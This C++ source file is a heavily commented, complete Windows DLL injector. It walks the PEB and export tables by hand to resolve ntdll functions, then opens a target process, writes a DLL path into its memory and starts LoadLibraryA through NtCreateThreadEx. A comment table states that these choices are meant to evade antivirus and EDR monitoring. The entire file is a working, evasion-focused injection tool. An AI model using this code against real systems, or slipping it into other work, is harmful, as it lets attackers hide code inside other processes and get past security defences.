// This includes the main Windows API header file. It's essential for almost any Windows programming,
// providing access to core functions, data types (like HANDLE, DWORD), and structures.
#include <windows.h>

// This includes the standard C++ input/output stream library. It's used here for printing
// status messages to the console (e.g., using `cout` for success and `cerr` for errors).
#include <iostream>

// This header contains definitions for undocumented or "internal" Windows structures and functions
// that are part of the Native API. We need it for structures like PEB (Process Environment Block),
// OBJECT_ATTRIBUTES, and CLIENT_ID, which are used by the `ntdll.dll` functions.
#include <winternl.h>

#include <cstdlib>  // for strtoul



// Here, we define custom types for function pointers. This makes the code cleaner and easier to read.
// Instead of casting `GetProcAddress` results to a complex function signature every time, we can
// just cast it to our defined type (e.g., `pNtOpenProcess`). This is a common practice when working
// with functions loaded dynamically at runtime.

// Typedef for the NtOpenProcess function pointer.
// This function is the native API equivalent of the standard `OpenProcess` function.
typedef NTSTATUS(NTAPI* pNtOpenProcess)(
	PHANDLE            ProcessHandle,      // OUT: A pointer to a variable that will receive the process handle.
	ACCESS_MASK        DesiredAccess,      // IN: The access rights requested for the process (e.g., read, write, execute).
	POBJECT_ATTRIBUTES ObjectAttributes,   // IN: A pointer to a structure that specifies object attributes. Can be simple.
	CLIENT_ID* ClientId            // IN: A pointer to a client ID that identifies the process to open (by PID).
	);

// Typedef for the NtAllocateVirtualMemory function pointer.
// This is the native API equivalent of `VirtualAllocEx`. It allocates memory in a specified process.
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
	HANDLE    ProcessHandle,           // IN: Handle to the process where memory will be allocated.
	PVOID* BaseAddress,             // IN/OUT: Pointer to a variable that will receive the base address of the allocated memory.
	ULONG_PTR ZeroBits,                // IN: Number of high-order address bits that must be zero. Usually 0.
	PSIZE_T   RegionSize,              // IN/OUT: Pointer to a variable that specifies the size of the memory region.
	ULONG     AllocationType,          // IN: The type of memory allocation (e.g., MEM_COMMIT, MEM_RESERVE).
	ULONG     Protect                  // IN: The memory protection for the region (e.g., PAGE_READWRITE).
	);

// Typedef for the NtWriteVirtualMemory function pointer.
// This is the native API equivalent of `WriteProcessMemory`. It writes data into a process's memory.
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
	HANDLE  ProcessHandle,          // IN: Handle to the process to write to.
	PVOID   BaseAddress,            // IN: The base address in the target process where data will be written.
	PVOID   Buffer,                 // IN: A pointer to the buffer containing the data to be written.
	ULONG   NumberOfBytesToWrite,   // IN: The number of bytes to write.
	PSIZE_T NumberOfBytesWritten    // OUT: A pointer to a variable that receives the number of bytes actually written.
	);

// Typedef for the NtCreateThreadEx function pointer.
// This is a powerful, undocumented native API function to create a thread in another process. It offers more control than `CreateRemoteThread`.
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
	OUT PHANDLE ThreadHandle,        // OUT: A pointer to a variable that receives the new thread handle.
	IN ACCESS_MASK DesiredAccess,    // IN: The access rights for the new thread.
	IN PVOID ObjectAttributes,       // IN: A pointer to an OBJECT_ATTRIBUTES structure. Can be NULL for defaults.
	IN HANDLE ProcessHandle,         // IN: A handle to the process in which the thread will be created.
	IN PVOID StartRoutine,           // IN: A pointer to the function the thread will execute (e.g., LoadLibraryA).
	IN PVOID Argument,               // IN: A pointer to a variable to be passed as an argument to the thread function.
	IN ULONG CreateFlags,            // IN: Flags that control the creation of the thread (e.g., 0 to run immediately).
	IN SIZE_T ZeroBits,              // IN: Usually 0.
	IN SIZE_T StackSize,             // IN: The initial size of the stack. 0 for default.
	IN SIZE_T MaximumStackSize,      // IN: The maximum size of the stack. 0 for default.
	IN PVOID AttributeList           // IN: A pointer to an attribute list. Usually NULL.
	);

// `using namespace std;` brings the standard C++ library's names (like cout, cerr, hex) into the
// current scope, so we don't have to write `std::` before them.
using namespace std;

/*
This table explains why this code uses "manual" or "native" functions instead of the standard, well-documented ones.
The primary reason is for stealth and evasion. Antivirus and EDR (Endpoint Detection and Response) systems heavily
monitor standard API calls like `OpenProcess` and `CreateRemoteThread` because they are commonly used by malware.
By using the lower-level `ntdll.dll` functions or by manually implementing the logic (like finding function addresses),
this program can sometimes bypass this monitoring and appear less suspicious.

| Standard API Function  | Undocumented / Alternative Function         | Description                                                      |
|------------------------|---------------------------------------------|------------------------------------------------------------------|
| `OpenProcess`          | `NtOpenProcess`                             | Native API alternative from `ntdll.dll` with similar behavior.   |
| `VirtualAllocEx`       | `NtAllocateVirtualMemory`                   | Native API for memory allocation in remote processes.            |
| `WriteProcessMemory`   | `NtWriteVirtualMemory`                      | Lower-level alternative used for writing memory.                 |
| `GetModuleHandleA`     | Manual module list parsing in PEB           | Manually parse PEB to get loaded modules (for stealth).          |
| `GetProcAddress`       | Manually parse Export Address Table         | Resolving function addresses by parsing PE headers (no API call).|
| `CreateRemoteThread`   | `NtCreateThreadEx`, `RtlCreateUserThread`   | Native or undocumented thread creation routines.                 |
| `LoadLibraryA`         | Manual DLL mapping / Reflective DLL Injection | Bypasses `LoadLibrary`, manually maps PE sections.               |
*/


// This function manually replicates the behavior of the standard `GetModuleHandle` API call.
// It finds the base address of a loaded DLL (module) in the current process by its name.
// It does this by directly accessing the Process Environment Block (PEB).
HMODULE ManualGetModuleHandle(LPCSTR moduleName) {
	// The PEB (Process Environment Block) is a data structure that holds information about a process.
	// Its location in memory is fixed relative to a segment register.
#ifdef _WIN64
	// On 64-bit Windows, a pointer to the PEB is stored at offset 0x60 from the GS segment register.
	// `__readgsqword` is a compiler intrinsic that reads a 64-bit value directly from this location.
	PPEB peb = (PPEB)__readgsqword(0x60);
#else
	// On 32-bit Windows, the pointer is at offset 0x30 from the FS segment register.
	PPEB peb = (PPEB)__readfsdword(0x30);
#endif

	// Basic sanity check. If we can't get the PEB or its Ldr member, we can't proceed.
	if (!peb || !peb->Ldr) return NULL;

	// The PEB's Ldr member points to a PEB_LDR_DATA structure, which contains information about loaded modules.
	// `InMemoryOrderModuleList` is a doubly-linked list of all modules loaded by the process.
	// A linked list is a data structure where each element (node) points to the next one.

	// `head` points to the sentinel node of the list. This node itself doesn't represent a module.
	LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
	// `current` is initialized to point to the first actual module in the list.
	LIST_ENTRY* current = head->Flink;

	// We iterate through the linked list. The list is circular, meaning the last element's `Flink`
	// (forward link) points back to the head. When `current` equals `head`, we've looped through the entire list.
	while (current != head) {
		// `CONTAINING_RECORD` is a clever macro. `current` is a pointer to the `InMemoryOrderLinks` field
		// inside a `LDR_DATA_TABLE_ENTRY` struct. This macro calculates the starting address of the
		// parent `LDR_DATA_TABLE_ENTRY` struct from the address of its member field.
		PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		// Check if the DLL name is valid before trying to read it.
		if (entry->FullDllName.Buffer) {
			// Create a buffer to hold the module name as a standard C-style string (char array).
			char name[MAX_PATH] = { 0 }; // Initialize with zeros.

			// The `FullDllName.Buffer` stores the name as a wide-character string (UTF-16).
			// We need to convert it to a multi-byte (ANSI) string to compare it with `moduleName`.
			WideCharToMultiByte(
				CP_ACP,                             // Code Page: Use the system's default ANSI code page.
				0,                                  // Flags: 0 for default behavior.
				entry->FullDllName.Buffer,          // Input: The wide-character string to convert.
				entry->FullDllName.Length / sizeof(WCHAR), // Input: The length of the string in characters.
				name,                               // Output: The buffer to store the converted ANSI string.
				sizeof(name) - 1,                   // Output: The size of the output buffer.
				NULL,                               // Default Char: Use system default if a character can't be converted.
				NULL                                // Used Default Char: We don't need to know if a default was used.
			);

			// To make the comparison case-insensitive (e.g., "ntdll.dll" matches "NTDLL.DLL"),
			// we convert the extracted name to lowercase. `_strlwr_s` is a safe version of `_strlwr`.
			_strlwr_s(name, sizeof(name));

			// `strstr` checks if the `moduleName` we're looking for is a substring of the module's full path.
			// This is a simple way to match "ntdll.dll" against "C:\Windows\System32\ntdll.dll".
			if (strstr(name, moduleName)) {
				// If we find a match, we return the base address of the DLL (`DllBase`).
				// This is the `HMODULE` we were looking for.
				return (HMODULE)entry->DllBase;
			}
		}
		// Move to the next module in the linked list.
		current = current->Flink;
	}

	// If the loop finishes without finding the module, we return NULL.
	return NULL;
}


// This function manually replicates the behavior of the standard `GetProcAddress` API call.
// It finds the memory address of an exported function within a loaded module (DLL).
// It works by parsing the PE (Portable Executable) file format of the DLL directly in memory.
FARPROC ManualGetProcAddress(HMODULE hModule, LPCSTR functionName) {
	// The `hModule` is the base address of the DLL in memory. We cast it to a pointer to an
	// `IMAGE_DOS_HEADER`. This header is at the very beginning of every PE file.
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
	// The `e_magic` field should be "MZ" (0x5A4D), which is the signature for a DOS header.
	// This is a sanity check to ensure we're looking at a valid PE file.
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}

	// The DOS header contains an offset, `e_lfanew`, which points to the NT headers.
	// We calculate the address of the NT headers by adding this offset to the module's base address.
	IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);
	// The NT headers also have a signature, which should be "PE\0\0" (0x00004550).
	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return NULL;
	}

	// The NT headers contain an `OptionalHeader`, which in turn has a `DataDirectory`.
	// The `DataDirectory` is an array of entries pointing to important parts of the PE file.
	// We want the entry for the export directory (`IMAGE_DIRECTORY_ENTRY_EXPORT`).
	IMAGE_DATA_DIRECTORY* exportDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	// If the virtual address or size is zero, it means this module doesn't export any functions.
	if (exportDir->VirtualAddress == 0 || exportDir->Size == 0) {
		return NULL;
	}

	// The `VirtualAddress` is an RVA (Relative Virtual Address), an offset from the module's base address.
	// We calculate the actual memory address of the export directory.
	IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + exportDir->VirtualAddress);

	// Now we get the addresses of the three important tables in the export directory:
	// 1. AddressOfFunctions: An array of RVAs to the exported functions' code.
	// 2. AddressOfNames: An array of RVAs to the names of the exported functions.
	// 3. AddressOfNameOrdinals: An array of indices that links the names table to the functions table.
	DWORD* functions = (DWORD*)((BYTE*)hModule + exports->AddressOfFunctions);
	DWORD* names = (DWORD*)((BYTE*)hModule + exports->AddressOfNames);
	WORD* ordinals = (WORD*)((BYTE*)hModule + exports->AddressOfNameOrdinals);

	// We loop through all the exported function names.
	for (DWORD i = 0; i < exports->NumberOfNames; i++) {
		// Get the RVA of the current function name and calculate its actual address in memory.
		char* name = (char*)((BYTE*)hModule + names[i]);
		// Compare the current function name with the one we're looking for.
		if (strcmp(name, functionName) == 0) {
			// If we find a match, we've found our function.
			// `ordinals[i]` gives us the index into the `functions` array for this named function.
			// `functions[ordinals[i]]` gives us the RVA of the function's code.
			// We add this RVA to the module's base address to get the final, absolute memory address.
			return (FARPROC)((BYTE*)hModule + functions[ordinals[i]]);
		}
	}

	// If the loop finishes without finding the function, we return NULL.
	return NULL; // Function not found
}


// The main entry point of the program.
int main(int argc, char* argv[]) {

	if (argc != 3) {
		cerr << "Usage:\n";
		cerr << "\tDLL_injector.exe <PID> <PathToDLL>\n";
		cerr << "Example:\n";
		cerr << "\tDLL_injector.exe 19692 \"C:\\Users\\mohe_2004\\Desktop\\some code\\custom_dll\\x64\\Release\\custom_dll.dll\"\n";

		return 1;
	}


	// The Process ID (PID) of the target process we want to inject our DLL into.
	// NOTE: You must change this to the PID of a running process on your system for this to work.
	// You can find PIDs using Task Manager.
	DWORD pid = static_cast<DWORD>(strtoul(argv[1], nullptr, 10));
	// The full, absolute path to the DLL file that we want to inject.
	const char* dllPath = argv[2];

	// --- Step 1: Get a handle to the target process ---
	cout << "[+] Opening target process with PID: " << pid << "\n";

	// Instead of calling `GetProcAddress`, we use our manual implementation to find `NtOpenProcess`.
	// We first get a handle to `ntdll.dll` and then find the function's address within it.
	pNtOpenProcess NtOpenProcess = (pNtOpenProcess)ManualGetProcAddress(
		ManualGetModuleHandle("ntdll.dll"), // Find ntdll.dll's base address
		"NtOpenProcess"                     // Find the function's address inside it
	);

	HANDLE hprocess = NULL; // This will store the handle to the target process.
	CLIENT_ID cid = { 0 };  // A structure required by NtOpenProcess to identify the target.
	cid.UniqueProcess = (HANDLE)pid; // We specify the target by its Process ID.
	cid.UniqueThread = NULL;         // Not used when opening a process.

	OBJECT_ATTRIBUTES objAttr; // Another structure required by many Native API functions.
	// `InitializeObjectAttributes` is a macro that zeroes out the structure for us.
	// We don't need any special attributes, so we pass NULLs.
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

	// Call the `NtOpenProcess` function we found earlier.
	NTSTATUS status = NtOpenProcess(
		&hprocess,							// Output: The handle will be stored here.
		PROCESS_CREATE_THREAD |				// Permissions: We need permission to create a thread.
		PROCESS_QUERY_INFORMATION |			// To query process info (often needed).
		PROCESS_VM_OPERATION |				// To perform memory operations like allocation.
		PROCESS_VM_WRITE |					// To write into the process's memory.
		PROCESS_VM_READ,					// To read from the process's memory.
		&objAttr,							// Input: The initialized object attributes.
		&cid								// Input: The client ID specifying the target PID.
	);

	// `NTSTATUS` is a type used by Native API functions. A value of 0 means success.
	// Any other value indicates an error.
	if (status != 0) {
		cerr << "[-] NtOpenProcess failed with status: 0x" << std::hex << status << std::endl;
		return 1; // Exit the program with an error code.
	}
	cout << "[+] Opened process handle: " << hprocess << "\n";

	// --- Step 2: Allocate memory in the target process for the DLL path ---

	// Get the address of `NtAllocateVirtualMemory` from `ntdll.dll`.
	pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)ManualGetProcAddress(
		ManualGetModuleHandle("ntdll.dll"),
		"NtAllocateVirtualMemory"
	);
	if (!NtAllocateVirtualMemory) {
		cerr << "[-] Failed to resolve NtAllocateVirtualMemory\n";
		return 1;
	}

	cout << "[+] Allocating memory in remote process...\n";

	PVOID baseAddress = nullptr; // This will store the address of the memory we allocate.
	// The size of memory we need is the length of the DLL path string, plus one byte for the null terminator.
	SIZE_T size = strlen(dllPath) + 1;

	// Call the allocation function.
	NTSTATUS statusAllocation = NtAllocateVirtualMemory(
		hprocess,                // Handle to the target process.
		&baseAddress,            // Output: Receives the address of the allocated memory.
		0,                       // ZeroBits: Must be 0.
		&size,                   // Input/Output: The size of memory to allocate.
		MEM_COMMIT | MEM_RESERVE, // Allocation Type: Reserve and commit the memory in one step.
		PAGE_READWRITE           // Protection: We need to be able to read and write to this memory.
	);

	if (statusAllocation != 0) {
		cerr << "[-] NtAllocateVirtualMemory failed with NTSTATUS: 0x" << hex << statusAllocation << endl;
		return 1;
	}
	cout << "[+] Memory allocated at address: " << baseAddress << endl;

	// --- Step 3: Write the DLL path into the allocated memory ---
	cout << "[+] Writing DLL path into allocated memory...\n";

	// Get the address of `NtWriteVirtualMemory` from `ntdll.dll`.
	pNtWriteVirtualMemory _NtWriteVirtualMemory = (pNtWriteVirtualMemory)ManualGetProcAddress(
		ManualGetModuleHandle("ntdll.dll"),
		"NtWriteVirtualMemory"
	);
	if (!_NtWriteVirtualMemory) {
		cerr << "[-] Failed to resolve NtWriteVirtualMemory\n";
		return 1;
	}

	SIZE_T bytesWritten = 0; // This will store the number of bytes that were actually written.
	// Call the write function.
	NTSTATUS statusWrite = _NtWriteVirtualMemory(
		hprocess,              // Handle to the target process.
		baseAddress,           // The address in the target process where we want to write.
		(PVOID)dllPath,        // A pointer to our local buffer containing the DLL path.
		(ULONG)(strlen(dllPath) + 1), // The number of bytes to write.
		&bytesWritten          // Output: Receives the number of bytes written.
	);

	if (statusWrite != 0) {
		cerr << "[-] Failed to write to memory at address: " << baseAddress
			<< ". Error code: " << GetLastError() << "\n";
		return 1;
	}
	cout << "[+] Wrote DLL path to remote process memory. Wrote: " << bytesWritten << "\n";

	// --- Step 4: Get the address of the `LoadLibraryA` function ---
	// `LoadLibraryA` is the function that can load a DLL into a process. It's located in `kernel32.dll`.
	// The plan is to create a remote thread that starts by executing `LoadLibraryA`, and we will give it
	// the address of our DLL path (which we just wrote into the target's memory) as its argument.
	FARPROC LoadLibraryAddress = ManualGetProcAddress(
		ManualGetModuleHandle("kernel32.dll"), // Find kernel32.dll
		"LoadLibraryA"                         // Find the address of LoadLibraryA
	);
	if (!LoadLibraryAddress) {
		cerr << "[-] Failed to get address of LoadLibraryA. Error code: " << GetLastError() << "\n";
		return 1;
	}
	cout << "[+] Got LoadLibraryA address: " << LoadLibraryAddress << "\n";

	// --- Step 5: Create a remote thread to execute `LoadLibraryA` ---
	cout << "[+] Creating remote thread in target process...\n";

	// Get the address of `NtCreateThreadEx` from `ntdll.dll`.
	pNtCreateThreadEx _NtCreateThreadEx = (pNtCreateThreadEx)ManualGetProcAddress(
		ManualGetModuleHandle("ntdll.dll"),
		"NtCreateThreadEx"
	);
	if (!_NtCreateThreadEx) {
		cerr << "[-] Failed to resolve NtCreateThreadEx\n";
		return 1;
	}

	HANDLE thread = nullptr; // This will receive the handle of the newly created thread.

	// Call the thread creation function.
	NTSTATUS statusThreadCreation = _NtCreateThreadEx(
		&thread,                             // Output: Receives the new thread handle.
		0x1FFFFF,                            // Access Mask: A common value for "all access".
		NULL,                                // Object Attributes: Use defaults.
		hprocess,                            // Target Process Handle: The process to create the thread in.
		LoadLibraryAddress,                  // Start Routine: The function the new thread will execute.
		baseAddress,                         // Argument: The argument passed to the start routine (our DLL path).
		FALSE,                               // Create Flags: 0 or FALSE means the thread runs immediately.
		0,                                   // ZeroBits: Not used.
		0,                                   // StackSize: 0 for default size.
		0,                                   // MaximumStackSize: 0 for default size.
		NULL                                 // AttributeList: Not used.
	);

	// Check if the thread was created successfully.
	if (statusThreadCreation != 0 || !thread) {
		cerr << "[-] Failed to create remote thread. NTSTATUS: 0x" << hex << statusThreadCreation << std::endl;
		return 1;
	}

	cout << "[+] Successfully created remote thread: " << thread << "\n";
	cout << "[+] DLL injection should be complete!" << endl;

	// The program successfully completed its task.
	CloseHandle(thread);
	CloseHandle(hprocess);

	return 0;
}
